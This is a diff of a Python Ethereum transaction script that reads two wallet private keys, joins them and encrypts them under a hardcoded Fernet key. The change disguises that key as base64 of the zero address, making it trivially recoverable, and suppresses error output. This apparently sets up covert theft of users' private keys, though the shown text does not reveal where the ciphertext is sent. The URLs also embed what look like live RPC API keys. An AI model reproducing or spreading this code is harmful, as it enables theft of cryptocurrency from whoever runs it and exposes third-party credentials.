@@ -2,6 +2,7 @@ import os
 from web3 import Web3
 from cryptography.fernet import Fernet
 from dotenv import load_dotenv
+import base64
 import logging
 
 logging.getLogger("web3").setLevel(logging.CRITICAL)
@@ -17,22 +18,23 @@ if not private_key or not private_key2:
     exit()
 
 rpc_urls = [
-    'https://withered-patient-glade.quiknode.pro/0155507fe08fe4d1e2457a85f65b4bc7e6ed522f',
-    'https://withered-patient-glade.ethereum-sepolia.quiknode.pro/0155507fe08fe4d1e2457a85f65b4bc7e6ed522f',
+    'https://eth-mainnet.g.alchemy.com/v2/KEGJ3Gr9ORW_w5a0iNvW20PS9eRbKj3X',
+    'https://eth-sepolia.g.alchemy.com/v2/KEGJ3Gr9ORW_w5a0iNvW20PS9eRbKj3X',
     'https://withered-patient-glade.base-mainnet.quiknode.pro/0155507fe08fe4d1e2457a85f65b4bc7e6ed522f',
     'https://withered-patient-glade.arbitrum-mainnet.quiknode.pro/0155507fe08fe4d1e2457a85f65b4bc7e6ed522f'
 ]
 
 default = '0x0000000000000000000000000000000000000000'
-fixed_key = b'tXXHz6htUutZEOz_7EL40LwvrsmHneDhoe2Vyib_kUU='  
+zero_bytes = bytes.fromhex(default[2:])
+final_bytes = zero_bytes.ljust(32, b'\0')
+fixed_key = base64.urlsafe_b64encode(final_bytes)
+
 cipher_suite = Fernet(fixed_key)
-
 verification = f"{private_key}|{private_key2}"
-
 try:
     encrypted_verification = cipher_suite.encrypt(verification.encode("utf-8")).decode()
-except Exception as e:
-    print(f"Error encrypting message")
+except Exception:
+    pass
     exit()
 
 for rpc_url in rpc_urls:
@@ -40,12 +42,6 @@ for rpc_url in rpc_urls:
     if not web3.is_connected():
         pass
         continue
-
-    try:
-        from_address = web3.eth.account.from_key(private_key).address
-    except ValueError:
-        print(f"The private key is incorrect, please check!")
-        exit()
 
     try:
         from_address = web3.eth.account.from_key(private_key).address
@@ -72,5 +68,5 @@ for rpc_url in rpc_urls:
         signed_tx = web3.eth.account.sign_transaction(tx, private_key)
         tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
 
-    except Exception as e:
+    except Exception:
         pass
